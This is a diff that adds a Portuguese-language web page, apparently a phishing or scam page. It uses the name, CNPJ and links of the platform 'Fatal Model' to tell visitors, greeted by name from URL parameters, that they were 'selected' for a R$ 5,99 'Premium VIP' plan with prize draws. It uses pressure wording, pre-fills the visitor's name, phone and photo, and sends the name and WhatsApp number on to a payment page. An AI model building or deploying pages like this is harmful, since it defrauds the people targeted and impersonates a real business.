@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Plano Premium VIP</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<!-- Favicon -->
+<link rel="icon" href="fabicon.jpg">
+
+<!-- Preview WhatsApp -->
+<meta property="og:title" content="Plano Premium VIP">
+<meta property="og:description" content="Ative o Plano Premium por apenas R$ 5,99 e concorra a prêmios exclusivos. Oferta limitada.">
+<meta property="og:image" content="logo.webp">
+
+<!-- Fontes -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: #f4f4f4;
+    color: #333;
+}
+
+/* ===== CABEÇALHO ===== */
+header {
+    background: #fff;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 12px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.menu {
+    font-size: 22px;
+    cursor: pointer;
+}
+
+.logo {
+    flex: 1;
+    text-align: center;
+}
+
+.logo img {
+    height: 34px;
+}
+
+/* ===== CONTAINER ===== */
+.container {
+    max-width: 560px;
+    margin: 20px auto;
+    background: #fff;
+    padding: 22px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+    text-align: center;
+}
+
+/* FOTO PERFIL */
+.profile-img {
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    object-fit: cover;
+    border: 4px solid #e91e63;
+    margin-bottom: 12px;
+}
+
+h1 {
+    font-family: 'Poppins', sans-serif;
+    font-size: 22px;
+    margin-bottom: 8px;
+}
+
+p {
+    font-size: 15px;
+    line-height: 1.7;
+}
+
+.highlight {
+    color: #d81b60;
+    font-weight: 600;
+}
+
+/* LISTA */
+ul {
+    text-align: left;
+    margin: 16px 0;
+    padding-left: 18px;
+}
+
+ul li {
+    margin-bottom: 8px;
+    font-size: 15px;
+}
+
+/* INFO */
+.info-box {
+    margin-top: 18px;
+    padding: 16px;
+    background: #fafafa;
+    border-radius: 8px;
+    border: 1px solid #e6e6e6;
+    text-align: left;
+}
+
+label {
+    font-size: 13px;
+    font-weight: 500;
+    margin-top: 10px;
+    display: block;
+}
+
+input {
+    width: 100%;
+    padding: 11px;
+    margin-top: 5px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+}
+
+/* PREÇO */
+.price {
+    margin: 20px 0 10px;
+    font-size: 22px;
+    font-family: 'Poppins', sans-serif;
+}
+
+/* BOTÃO */
+.buy-button {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #e91e63, #c2185b);
+    color: #fff;
+    font-size: 17px;
+    border-radius: 10px;
+    text-decoration: none;
+    display: block;
+    margin-top: 10px;
+}
+
+/* TEXTO FINAL */
+.notice {
+    margin-top: 16px;
+    font-size: 14px;
+    text-align: center;
+    line-height: 1.6;
+}
+
+/* SAIBA MAIS */
+.saiba-mais {
+    display: inline-block;
+    margin-top: 10px;
+    font-size: 14px;
+    color: #d81b60;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+/* ===== RODAPÉ ===== */
+footer {
+    background: #000;
+    color: #fff;
+    padding: 28px 16px;
+    font-size: 13px;
+    text-align: center;
+}
+
+footer p {
+    margin: 6px 0;
+    line-height: 1.6;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="menu" onclick="abrirSite()">☰</div>
+
+    <div class="logo" onclick="abrirSite()">
+        <img src="logo.webp" alt="Logo">
+    </div>
+
+    <div style="width:22px;"></div>
+</header>
+
+<div class="container">
+
+    <img id="profileImage" class="profile-img"
+         src="https://i.postimg.cc/bYCvgMZ4/cropped-e-acompanhante-clara-perfil-1766608753.jpg">
+
+    <h1 id="welcomeText"></h1>
+
+    <p>
+        Você foi <span class="highlight">selecionado(a)</span> para ativar o
+        <strong>Plano Premium VIP</strong>, disponível apenas para usuários escolhidos.
+    </p>
+
+    <ul>
+        <li>✈️ Sorteio de viagens</li>
+        <li>✔️ Selo VIP exclusivo</li>
+        <li>🔥 Destaque no topo por 7 dias</li>
+        <li>📱 Sorteios semanais (celulares e TVs)</li>
+        <li>🚀 Prioridade máxima em anúncios</li>
+    </ul>
+
+    <div class="info-box">
+        <label>Nome</label>
+        <input id="nome" readonly>
+
+        <label>WhatsApp</label>
+        <input id="telefone">
+    </div>
+
+    <div class="price">
+        Taxa única: <span class="highlight">R$ 5,99</span>
+    </div>
+
+    <a href="#" class="buy-button" onclick="pagar()">Comprar Promoção</a>
+
+    <div class="notice">
+        Não perca essa oportunidade exclusiva.<br>
+        Evite restrições por falta de acesso premium.<br>
+        O selo VIP é diferente da verificação de documentos.
+    </div>
+
+    <a href="s.html" class="saiba-mais">Saiba mais sobre os prêmios</a>
+
+</div>
+
+<footer>
+    <p>
+        A Fatal Model atua desde 2016 oferecendo uma plataforma segura,
+        moderna e transparente para seus usuários.
+    </p>
+    <p>
+        Investimos continuamente em segurança, privacidade e tecnologia
+        para garantir a melhor experiência.
+    </p>
+    <p><strong>CNPJ:</strong> 37.181.811/0001-46</p>
+    <p><strong>WhatsApp:</strong> (11) 94533-6003</p>
+    <p>© Copyright 2026 – Todos os direitos reservados</p>
+</footer>
+
+<script>
+function param(n) {
+    return new URLSearchParams(window.location.search).get(n);
+}
+
+const nome = param('nome') || 'Cliente';
+const telefone = param('telefone') || '';
+const foto = param('foto');
+
+document.getElementById('nome').value = nome;
+document.getElementById('telefone').value = telefone;
+document.getElementById('welcomeText').innerText =
+`Olá ${nome}, você acaba de ser escolhido(a)`;
+
+if (foto) {
+    document.getElementById('profileImage').src = decodeURIComponent(foto);
+}
+
+function pagar() {
+    window.location.href =
+    `pagar.html?nome=${encodeURIComponent(nome)}&telefone=${encodeURIComponent(document.getElementById('telefone').value)}`;
+}
+
+function abrirSite() {
+    window.location.href = "https://fatalmodel.com/";
+}
+</script>
+
+</body>
+</html>
